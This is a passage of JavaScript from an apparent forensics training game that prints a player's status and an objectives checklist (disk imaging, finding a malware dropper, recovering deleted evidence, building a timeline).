                e.printLine('  Timeline built:     ' + (s.timelineBuilt ? 'YES' : 'no'), s.timelineBuilt ? 'success' : 'system');
                e.printLine('', 'system');
                e.printLine('Objectives:', 'heading');
                var objText = [
                    'Image the disk (examine DISK-IMAGE)',
                    'Find malware dropper (strings at BROWSER)',
                    'Recover deleted evidence (recover at RECYCLE-BIN)',
                    'Build forensic timeline (3+ sources + timeline command)'
                ];
                for (var j = 0; j < s.objectives.length; j++) {
                    e.printLine((s.objectives[j] ? ' [X] ' : ' [ ] ') + objText[j], s.objectives[j] ? 'success' : 'system');
                }
            }
        }
    }
};
